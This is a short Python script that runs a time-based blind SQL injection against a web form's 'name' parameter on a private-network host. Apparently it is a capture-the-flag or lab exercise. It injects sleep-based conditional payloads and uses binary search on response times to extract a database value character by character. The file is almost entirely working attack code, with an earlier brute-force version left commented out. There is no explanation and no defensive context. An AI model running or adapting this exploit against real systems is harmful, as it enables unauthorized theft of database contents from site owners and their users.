import requests
import datetime

flag = datetime.timedelta(days=0,
                           seconds=1,
                           microseconds=0,
                           milliseconds=0,
                           minutes=0,
                           hours=0,
                           weeks=0)

# for i in range(1,75):
#     for j in range(36,126):
#        resp = requests.post(url="http://10.8.32.1:40735", data={"name":f"1' and if (id=592173392 and Ascii(substring(name,{i},1))={j}, sleep(2),0) -- -"})
#        requtime = resp.elapsed
#        resp.close()
#        if requtime > flag:
#            print(j, end=" ")
#            break

# resp = requests.post(url="http://10.8.32.1:40735", data={"name":f"1' and if (id=592173392 and Ascii(substring(name,1,1)=99), sleep(1),0) -- -"})
# if resp.elapsed > flag:
#     print("da")
# resp.close()

def blind_query(char_index, mid, znak):
    resp = requests.post(url="http://10.8.32.1:40734", data={"name": f"1' and if (id=592173392 and Ascii(substring(name,{char_index},1)){znak}{mid}, sleep(1),0) -- -"})
    requtime = resp.elapsed
    resp.close()
    if requtime > flag:
        return True
    else:
        return False

def reqursion_find(start, end, char_index):
    if start > end:
        return -1
    mid = (start + end) // 2
    if blind_query(char_index=char_index, mid=mid, znak="="):
        return mid

    if blind_query(char_index=char_index, mid=mid, znak="<"):
        return reqursion_find(start, mid - 1, char_index=char_index)
    else:
        return reqursion_find(mid + 1, end, char_index=char_index)



for i in range(1,75):
    char = reqursion_find(32,126,i)
    if char == -1:
        print("work finish")
        break
    print(char, end=" ")